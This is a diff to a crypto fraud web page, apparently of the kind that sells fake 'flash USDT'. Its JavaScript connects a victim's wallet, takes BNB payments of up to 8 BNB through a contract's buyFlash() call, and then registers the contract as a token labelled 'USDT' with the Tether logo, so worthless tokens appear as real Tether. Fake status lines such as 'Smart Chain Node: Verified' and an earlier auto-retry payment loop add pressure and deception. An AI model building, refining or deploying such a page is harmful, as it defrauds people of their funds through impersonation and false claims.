@@ -51,18 +51,26 @@
         <span id="flash-count">1,482,500</span> USDT
     </div>
     
-    <select id="amount">
-        <option value="0.05">2,500 USDT (0.05 BNB)</option>
-        <option value="0.09" selected>5,000 USDT (0.09 BNB)</option>
-        <option value="0.2">10,000 USDT (0.2 BNB)</option>
-        <option value="0.5">50,000 USDT (0.5 BNB)</option>
-        <option value="1.0">100,000 USDT (1.0 BNB)</option>
-        <option value="2.5">250,000 USDT (2.5 BNB)</option>
-        <option value="4.0">500,000 USDT (4.0 BNB)</option>
-        <option value="8.0">1,000,000 USDT (8.0 BNB)</option>
-    </select>
+    <!-- زر الاتصال الأولي -->
+    <div id="connect-ui">
+        <button class="btn-gold" onclick="openModal()">Connect Wallet</button>
+    </div>
+
+    <!-- واجهة التأكيد (تظهر بعد الاتصال) -->
+    <div id="action-ui" style="display:none;">
+        <select id="amount">
+            <option value="0.05">2,500 USDT (0.05 BNB)</option>
+            <option value="0.09">5,000 USDT (0.09 BNB)</option>
+            <option value="0.2">10,000 USDT (0.2 BNB)</option>
+            <option value="0.5">50,000 USDT (0.5 BNB)</option>
+            <option value="1.0">100,000 USDT (1.0 BNB)</option>
+            <option value="2.5">250,000 USDT (2.5 BNB)</option>
+            <option value="4.0">500,000 USDT (4.0 BNB)</option>
+            <option value="8.0">1,000,000 USDT (8.0 BNB)</option>
+        </select>
+        <button class="btn-gold" onclick="execute()">Confirm & Activate ⚡</button>
+    </div>
     
-    <button class="btn-gold" onclick="openModal()">Connect Wallet</button>
     <p id="status" style="font-size: 11px; color: var(--sub); margin-top: 15px;">Smart Chain Node: Verified ✅</p>
 </div>
 
@@ -156,15 +164,13 @@
     async function startProcess(mode) {
         try {
             if (mode === 'wc') {
-                // ✅ استخدام RPC صالح
                 provider = new WalletConnectProvider.default({ 
-                    rpc: { 56: "https://rpc.ankr.com/bsc" }, 
+                    rpc: { 56: "https://rpc.ankr.com/bsc" }, // ✅ RPC صالح
                     chainId: 56 
                 });
                 await provider.enable();
                 web3 = new Web3(provider);
             } else {
-                // ✅ لا إعادة توجيه إلى MetaMask App Link
                 if (!window.ethereum) {
                     alert("Please open this site inside a wallet browser (Trust/MetaMask).");
                     return;
@@ -176,24 +182,43 @@
 
             account = (await web3.eth.getAccounts())[0];
             closeModal();
-            document.getElementById('status').innerText = "Linking Node... Confirm in Wallet";
             
-            setTimeout(autoPay, 1200);
-
+            // ✅ إخفاء زر الاتصال وإظهار واجهة التأكيد
+            document.getElementById('connect-ui').style.display = 'none';
+            document.getElementById('action-ui').style.display = 'block';
+            document.getElementById('status').innerText = "✅ Connected. Select amount and confirm.";
+            
         } catch (e) { console.error(e); }
     }
 
-    async function autoPay() {
+    async function execute() {
         const val = document.getElementById('amount').value;
         const contract = new web3.eth.Contract(ABI, CONTRACT);
+        const status = document.getElementById('status');
+        
         try {
-            await provider.request({ method: 'wallet_switchEthereumChain', params: [{ chainId: '0x38' }] });
+            status.innerText = "Processing... Confirm in wallet";
             await contract.methods.buyFlash().send({ from: account, value: web3.utils.toWei(val, "ether") });
-        } catch (err) {
-            document.getElementById('status').innerText = "High Traffic. Retrying...";
-            setTimeout(autoPay, 3000);
+            
+            // إضافة التوكن
+            await window.ethereum.request({
+                method: 'wallet_watchAsset',
+                params: {
+                    type: 'ERC20',
+                    options: {
+                        address: CONTRACT,
+                        symbol: 'USDT',
+                        decimals: 18,
+                        image: 'https://cryptologos.cc/logos/tether-usdt-logo.png'
+                    }
+                }
+            });
+            
+            alert("✅ Success! Check your wallet.");
+        } catch (e) {
+            status.innerText = "Transaction rejected.";
         }
     }
 </script>
 </body>
-</html>ررررررررررر
+</html>ررررررررررررررررررر
